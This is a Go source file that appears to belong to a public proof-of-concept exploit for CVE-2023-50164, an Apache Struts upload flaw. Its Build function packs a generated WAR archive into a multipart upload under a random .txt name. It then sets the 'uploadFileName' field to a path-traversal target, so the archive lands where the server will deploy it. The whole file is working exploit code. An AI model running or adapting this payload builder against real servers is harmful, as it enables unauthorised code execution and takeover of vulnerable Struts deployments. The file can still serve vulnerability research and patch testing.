package payload

import (
	"bytes"
	"io"
	"os"

	"mime/multipart"
	"path/filepath"

	"github.com/brianvoe/gofakeit/v6"
	"github.com/dwisiswant0/cve-2023-50164-poc/internal/pkg/utils"
	"github.com/dwisiswant0/cve-2023-50164-poc/internal/pkg/war"
)

func Build(p, t string) (*Payload, error) {
	payload := new(Payload)
	b := new(bytes.Buffer)
	m := multipart.NewWriter(b)

	d, err := os.MkdirTemp("", "")
	if err != nil {
		return payload, err
	}
	payload.tmpDir = d

	w, err := war.Generate(p, d)
	if err != nil {
		return payload, err
	}
	payload.War = w

	u := gofakeit.Gamertag() + ".txt"
	f, err := m.CreateFormFile("Upload", u)
	if err != nil {
		return payload, err
	}

	o, err := os.Open(w)
	if err != nil {
		return payload, err
	}

	_, err = io.Copy(f, o)
	if err != nil {
		return payload, err
	}

	t = filepath.Join(t, filepath.Base(w))

	err = m.WriteField("uploadFileName", t)
	if err != nil {
		return payload, err
	}

	m.Close()

	payload.Buffer = b
	payload.contentType = m.FormDataContentType()
	payload.Path = filepath.Join("/", utils.GetBasename(p)[0], filepath.Base(p))

	return payload, nil
}
